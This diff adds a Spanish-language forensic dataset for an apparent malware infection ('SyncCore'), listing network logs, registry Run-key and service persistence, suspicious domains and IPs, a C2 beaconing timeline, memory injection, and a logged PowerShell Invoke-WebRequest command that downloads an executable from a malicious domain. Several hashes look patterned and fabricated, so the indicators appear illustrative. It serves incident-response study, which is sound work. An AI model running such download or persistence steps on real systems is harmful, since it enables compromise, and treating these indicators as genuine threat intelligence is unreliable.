@@ -1,0 +1,116 @@
+LOGS DE RED 
+
+2026-08-20 09:14:22 SRC=10.22.14.55 DST=185.203.44.91 PROTO=HTTPS BYTES_OUT=42112 UA="Mozilla/5.0 (SyncCore/4.1)"
+
+2026-08-20 09:14:25 SRC=10.22.14.55 DST=91.214.67.12 PROTO=HTTP URL="/update/check" STATUS=200
+
+2026-08-20 09:15:02 SRC=10.22.14.55 DST=46.72.199.5 PROTO=TCP PORT=8080 ACTION=ALLOWED
+
+2026-08-20 09:15:45 DNS_QUERY sync-data-secure.com RESPONSE 185.203.44.91
+
+
+PROCESOS Y ARTEFACTOS EN DISCO
+
+PROCESS=core_sync.exe PID=4421 PATH=C:\Users\Public\core_sync.exe
+HASH_SHA256=9f8c7b6a5d4e3f2a1b0c9d8e7f6a5b4c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f
+
+PROCESS=update_agent.dll PID=3312 PATH=C:\ProgramData\Update\update_agent.dll
+HASH_MD5=aa11bb22cc33dd44ee55ff6677889900
+
+FILE_WRITE PATH=C:\Windows\System32\drivers\syncdrv.sys SIZE=53248
+
+NEW_SERVICE Name="SyncCoreSvc" Binary="C:\Users\Public\core_sync.exe"
+
+REGISTRO (PERSISTENCIA)
+
+REGISTRY_WRITE HKCU\Software\Microsoft\Windows\CurrentVersion\Run\sync_core
+VALUE=C:\Users\Public\core_sync.exe
+
+REGISTRY_WRITE HKLM\SYSTEM\CurrentControlSet\Services\SyncCoreSvc
+BinaryPath=C:\Users\Public\core_sync.exe
+
+TASK_SCHEDULED Name="CoreUpdater" Trigger="AtLogon" Action="C:\ProgramData\Update\update_agent.dll"
+
+DOMINIOS, IPs, URLs 
+
+Dominios sospechosos:
+
+sync-data-secure[.]com
+
+update-core-system[.]net
+
+telemetry-cloud-hub[.]org
+
+IPs sospechosas:
+
+185.203.44.91
+
+91.214.67.12
+
+46.72.199.5
+
+URLs observadas:
+
+https://sync-data-secure[.]com/api/v1/pullcfg
+
+http://update-core-system[.]net/download/agent_v3.exe
+
+http://telemetry-cloud-hub[.]org/ping?id=HOSTNAME
+
+EVENTOS DE SEGURIDAD
+
+EVENT_ID=4688 NewProcessName=C:\Users\Public\core_sync.exe Parent=explorer.exe User=Jorge-PC\Jorge
+
+EVENT_ID=5156 AllowedConnection Src=10.22.14.55 Dst=185.203.44.91 Port=443
+
+EVENT_ID=4104 PowerShell Command="Invoke-WebRequest -Uri http://update-core-system.net/download/agent_v3.exe"
+
+EVENT_ID=1116 MalwareDetected Name="SyncCore" Path=C:\Users\Public\core_sync.exe
+
+INDICADORES CRUZADOS
+Hashes:
+
+SHA256: a9f3c1d9b7e4f0c2d8a1e9f4b3c7d1e2f9a0b3c7d8e1f2a9c3b7d1e0f9a2c3b
+
+SHA256: f1c2d3e4b5a6978877665544332211ffeeddccbbaa99887766554433221100f
+
+User-Agent anómalo:
+
+Mozilla/5.0 (SyncCore/4.1)
+
+SyncTelemetry/2.0
+
+JA3 fingerprint:
+
+771,4865,4866,4867,49195
+
+TRAZA DE ACTIVIDAD
+
+09:14:22 → core_sync.exe inicia
+09:14:23 → Escribe clave Run
+09:14:25 → Conexión a sync-data-secure.com
+09:15:02 → Descarga agent_v3.exe
+09:15:45 → Crea servicio SyncCoreSvc
+09:16:10 → Conexión periódica cada 90s al C2
+
+
+PAQUETES DE RED
+
+TLS ClientHello JA3=771,4865,4866,4867,49195 SNI=sync-data-secure.com
+
+POST /api/v1/pullcfg Host: sync-data-secure.com Content-Length: 512
+
+Encrypted payload size=2048 bytes interval=90 seconds
+
+ARTEFACTOS PARA ANÁLISIS FORENSE
+
+C:\Users\Public\core_sync.exe
+C:\ProgramData\Update\update_agent.dll
+C:\Windows\System32\drivers\syncdrv.sys
+C:\Users\Public\Logs\sync_core.log
+
+ACTIVIDAD SOSPECHOSA EN MEMORIA
+
+MEMORY_REGION 0x7ffde00000 RWX Size=64KB AssociatedProcess=core_sync.exe
+
+InjectedThread Target=explorer.exe Source=core_sync.exe
